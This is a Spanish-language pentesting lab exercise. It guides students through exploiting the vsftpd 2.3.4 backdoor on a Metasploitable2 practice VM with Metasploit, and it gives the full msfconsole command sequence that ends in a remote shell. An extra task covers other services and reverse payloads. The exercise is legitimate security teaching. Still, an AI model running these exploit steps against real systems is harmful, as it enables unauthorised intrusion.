# Laboratorio 04 · Explotando un servicio vulnerable con Metasploit

## 🎯 Objetivo

Pasar de "sé qué versión de software corre ahí" (Laboratorios 01-02) a "consigo acceso a la máquina explotando esa versión concreta". Vas a usar Metasploit Framework contra un servicio de Metasploitable2 con una vulnerabilidad conocida y documentada.

## 🧪 Entorno necesario

- Las mismas VMs: Kali (atacante) y Metasploitable2 (objetivo), misma red interna.
- Tu escaneo del Laboratorio 01 a mano, para saber qué versiones de servicio tiene tu objetivo.

## 📖 Qué es Metasploit y cómo funciona

**Metasploit Framework** es una base de datos de **exploits** (código que aprovecha una vulnerabilidad conocida) junto con una herramienta para lanzarlos de forma ordenada. En vez de escribir tú el código que aprovecha un fallo, Metasploit ya tiene miles de exploits probados, catalogados por el servicio y versión a la que afectan.

Tres conceptos que vas a usar constantemente:

- **Exploit**: el código que aprovecha la vulnerabilidad para conseguir ejecutar algo en la máquina objetivo.
- **Payload**: lo que quieres que pase *una vez* el exploit funciona — normalmente, abrir una shell (línea de comandos) en la máquina objetivo.
- **Shell reversa vs directa**: en una shell directa, tú te conectas al puerto de la víctima. En una shell **reversa**, es la víctima la que se conecta de vuelta a ti. La reversa es mucho más habitual en el mundo real porque muchos firewalls bloquean conexiones entrantes pero no salientes.

### Ejemplo guiado: vsftpd 2.3.4 (backdoor conocido)

Metasploitable2 trae instalada una versión de `vsftpd` (2.3.4) que tiene una puerta trasera conocida y pública — es un ejemplo clásico para aprender porque es extremadamente fiable y fácil de entender.

```bash
msfconsole
```
- Arranca la consola de Metasploit. Tarda unos segundos en cargar la base de datos de exploits.

```
search vsftpd
```
- Dentro de `msfconsole`, busca en la base de datos de exploits por nombre de servicio. Te debería aparecer algo como `exploit/unix/ftp/vsftpd_234_backdoor`.

```
use exploit/unix/ftp/vsftpd_234_backdoor
```
- Selecciona ese exploit concreto como el que vas a usar. A partir de ahora, los comandos `set` configuran opciones de *este* exploit.

```
show options
```
- Te lista qué parámetros necesita el exploit — normalmente al menos `RHOSTS` (la IP objetivo).

```
set RHOSTS 192.168.56.X
```
- Configura la IP de tu Metasploitable (sustituye `X` por la tuya).

```
run
```
- Lanza el exploit. Si todo va bien, te deja con una shell directamente conectada a la máquina — prueba a escribir `whoami` o `id` para confirmar qué usuario eres.

## 🪜 Pasos a seguir

1. Confirma con tu escaneo del Laboratorio 01 que el puerto 21 (FTP) está abierto en tu objetivo.
2. Sigue el ejemplo guiado de arriba paso a paso, explicándote a ti mismo (por escrito, en tu writeup) qué hace cada comando antes de ejecutarlo.
3. Una vez tengas la shell, comprueba qué usuario eres (`whoami`, `id`) y en qué carpeta estás (`pwd`).
4. En tu `writeup.md`, documenta: qué exploit usaste, qué vulnerabilidad aprovecha (búscala, aunque sea el nombre básico — "backdoor en el código fuente de vsftpd 2.3.4"), y qué nivel de acceso conseguiste.

## 💡 Pistas si te atascas

- Si `search vsftpd` no devuelve nada, actualiza la base de datos de exploits con `msfupdate` (puede tardar) o revisa que tu Metasploit esté actualizado.
- Si el exploit falla, revisa que la IP en `RHOSTS` sea correcta con `show options` antes de volver a lanzar `run`.
- Una vez dentro, si la shell "no responde bien" a comandos normales, puede que sea una shell muy básica — prueba comandos simples uno a uno en vez de copiar y pegar varios a la vez.

## 🚀 Reto extra

- Metasploitable2 tiene más servicios vulnerables aparte de vsftpd (por ejemplo, Samba o un servicio de Java RMI). Con tu escaneo del Laboratorio 01, elige otro servicio, busca con `search` si Metasploit tiene un exploit para esa versión, y repite el proceso.
- Investiga la diferencia entre un payload `bind` (shell directa) y uno `reverse` — en algunos exploits puedes elegir con `set PAYLOAD`. Prueba a cambiarlo si el exploit lo permite y observa la diferencia.
